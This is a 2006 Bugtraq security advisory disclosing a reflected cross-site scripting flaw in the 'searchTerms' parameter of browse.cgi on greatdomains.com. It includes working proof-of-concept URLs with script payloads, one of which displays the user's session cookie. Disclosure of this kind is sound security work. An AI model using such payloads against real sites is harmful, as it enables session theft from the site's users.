
Date: 16 Jun 2006 18:59:26 -0000
From: admin@...orsecurity.de
To: bugtraq@...urityfocus.com
Subject: GreatDomains.com - XSS with cookie disclosure


GreatDomains.com - XSS with cookie disclosure
----------------------------------------------
Type: Cross site scripting

Date: June, 16th 2006
----------------------------------------------

Credits:
----------------------------------------------
Discovered by: David "Aesthetico" Vieira-Kurz
http://www.majorsecurity.de
----------------------------------------------

Vulnerability:
----------------------------------------------
I found a bug on "http://greatdomains.com".

Input passed to the "searchTerms" parameter in "browse.cgi" is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.

Sending a malicious code will result a code working on the page that pops up...

http://greatdomains.com/[SESSION_ID]/cgi-bin/browse.cgi?searchTerms=[XSS CODE HERE]

Examples:
----------------------------------------------
http://greatdomains.com/en-def-b6b0e2943a74/cgi-bin/browse.cgi?searchTerms=<script>alert("MajorSecurity")</script>
http://greatdomains.com/en-def-b6b0e2943a74/cgi-bin/browse.cgi?searchTerms=<script>alert(document.cookie)</script>

Screenshots:
----------------------------------------------
http://majorsecurity.de/advisory/greatdomains_bug/greatdomains1.JPG
http://majorsecurity.de/advisory/greatdomains_bug/greatdomains2.JPG
http://majorsecurity.de/advisory/greatdomains_bug/greatdomains3.JPG


